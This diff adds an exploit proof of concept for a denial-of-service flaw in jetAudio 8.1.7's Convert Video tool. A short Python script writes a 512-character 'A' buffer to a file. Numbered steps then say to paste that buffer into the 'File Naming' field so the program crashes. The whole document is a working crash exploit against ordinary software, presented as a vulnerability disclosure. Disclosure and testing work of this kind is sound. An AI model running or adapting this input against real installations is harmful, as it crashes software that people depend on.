@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: Convert Video jetAudio 8.1.7 - Denial of Service (PoC)
+# Date: 08/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.jetaudio.com/
+# Software Link http://www.jetaudio.com/download/5fc01426-741d-41b8-a120-d890330ec672/jetAudio/JAD8107_BASIC.exe
+# Version: 8.1.7 
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "ConvertVideo.py", it will create a new file "ConvertVideo.txt"
+# 2.- Copy the text from the generated ConvertVideo.txt file to clipboard
+# 3.- Open JetVidCnv.exe or Video Converter
+# 4.- Click on the 'Add Files...' button and select a video file
+# 5.- Paste clipboard in in the field "File Naming"
+# 6.- Click on the 'Preview' button
+# 7.- Crashed
+
+buffer = "\x41" * 512
+f = open ("ConvertVideo.txt", "w")
+f.write(buffer)
+f.close()
